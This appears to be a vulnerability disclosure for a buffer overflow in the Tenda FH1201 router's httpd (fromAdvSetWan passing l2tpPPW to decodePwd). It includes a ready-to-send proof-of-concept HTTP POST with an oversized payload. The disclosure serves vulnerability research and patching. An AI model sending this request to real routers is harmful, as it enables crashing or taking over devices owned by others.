# fh1201 Vulnerability

Vendor:Tenda

Product:fh1201 

Version:1.2.0.14(408)

Vulnerability: buffer overflow

## Descriptions

We found overflow vulnerability  in `httpd` :

In  fromAdvSetWan function,the router compare the `wanmode` parameter.

When the value of `wanmode` is `4`, the value of the `l2tpPPW` will be stored in v6.

<div  align="center"><img src="./img/function.png" style="zoom:80%;" /></div>

Finally,the function uses decodePwd() to handle v6 and  s_ ,that causes  buffer overflow.

<div  align="center"><img src="./img/decodePwd.png" style="zoom:80%;" /></div>

## Proof of Concept (PoC)

```http
POST /goform/AdvSetWan HTTP/1.1
Host: 192.168.6.2
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Referer: http://192.168.6.2/index.asp
Accept-Encoding: gzip, deflate, br
Cookie: SESSION_ID=2:1769648739:2
Connection: keep-alive
Content-Length: 2561

wanmode=4&l2tpPPW=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## Overcome
<div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>

